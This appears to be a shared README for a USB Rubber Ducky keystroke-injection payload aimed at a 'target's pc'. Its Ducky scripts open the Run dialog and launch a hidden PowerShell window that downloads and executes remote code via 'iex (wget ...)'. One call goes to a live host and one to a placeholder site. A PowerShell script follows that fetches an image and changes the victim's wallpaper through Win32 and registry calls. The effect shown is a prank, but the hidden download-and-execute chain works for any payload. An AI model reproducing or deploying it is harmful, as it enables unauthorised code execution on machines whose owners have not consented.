Pre-written and execution-ready code:

If you do not have access to a web server and want to get this running, here is pre-uploaded code. Code is at [this gist](https://gist.github.com/judge2020/034d6201d6b24f079e0d692bea3e92b0) containing the PS code, and the image is hosted on GitHub directly.

By default, it goes to an My Little Pony image, however you can set the 'image' GET parameter to change it at will. Eg change `https://judge.sh/wallpaper.php` to `https://judge.sh/wallpaper.php?image=https://imgur.com/test.png`.
```
SLEEP 1000
GUI r
DELAY 250
STRING powershell -windowstyle hidden iex (wget https://judge.sh/wallpaper.php)
ENTER
```


Below is original text
---


GET THE CODE SNIPS HERE:

https://www.lostserver.com/static/rubberduckcode.txt

It will set the background image on a targets pc to whatever jpg you want - i recommend mylittleponys :) 

Regards Keld Norman@DK

Write this code to your Rubber Ducky payload file using the encoder, the wget is an alias that exist in powershell already: 
---------------------------------------------------------------------
```
SLEEP 600
GUI r
DELAY 150
STRING powershell -windowstyle hidden iex (wget http://your-website.com/powershellscript.ps)
ENTER
```
The Powershell script on your webserver (http://your-website.com/powershellscript.ps):
---------------------------------------------------------------------
```
(new-object System.Net.WebClient).DownloadFile('http://your-website.com/mylittlepony.jpg',"$Env:Temp\\b.jpg");
Add-Type @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32;
namespace Wallpaper
{
 public enum Style : int
{
    Tile, Center, Stretch, NoChange
 }
 public class Setter {
  public const int SetDesktopWallpaper = 20;
  public const int UpdateIniFile = 0x01;
  public const int SendWinIniChange = 0x02;
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
  private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
  public static void SetWallpaper ( string path, Wallpaper.Style style ) {
     SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
     RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\\\Desktop", true);
     switch( style )
     {
        case Style.Stretch :
           key.SetValue(@"WallpaperStyle", "2") ;
           key.SetValue(@"TileWallpaper", "0") ;
           break;
        case Style.Center :
           key.SetValue(@"WallpaperStyle", "1") ;
           key.SetValue(@"TileWallpaper", "0") ;
           break;
        case Style.Tile :
           key.SetValue(@"WallpaperStyle", "1") ;
           key.SetValue(@"TileWallpaper", "1") ;
           break;
        case Style.NoChange :
           break;
     
     key.Close();
      }
    }
}
"@
[Wallpaper.Setter]::SetWallpaper("$Env:Temp\b.jpg" , 2 )
```
